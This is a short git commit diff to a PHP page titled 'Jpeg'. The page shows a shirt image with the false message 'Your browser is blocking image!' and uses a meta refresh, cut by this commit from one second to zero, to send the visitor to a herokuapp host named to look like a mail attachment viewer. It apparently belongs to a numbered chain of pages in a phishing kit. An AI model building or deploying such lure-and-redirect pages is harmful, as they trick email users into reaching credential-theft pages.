24e2c9668cf7600c4860f7884cf9f4cb86fb864e
bobstottts <bobstottts@googlemail.com>
2017-11-27 00:16:09 -0500

    Update 14.php

--- u/u/14.php
+++ u/u/14.php
@@ -4,6 +4,6 @@
 	<title>Jpeg</title>
 </head>
 <body></body>
-<meta content="1;url=https://mail-view-att.herokuapp.com/u/u/15.php" http-equiv="refresh" /><span style="font-size:10px;">Your browser is blocking image!</span>
+<meta content="0;url=https://mail-view-att.herokuapp.com/u/u/15.php" http-equiv="refresh" /><span style="font-size:10px;">Your browser is blocking image!</span>
 <p style="text-align: center;"><span style="font-size:10px;"><img alt="" src="http://p.globalsources.com/IMAGES/PDT/B1145957349/Mens-Dress-Shirt.jpg" style="width: 360px; height: 360px;" /></span></p>
 </html>
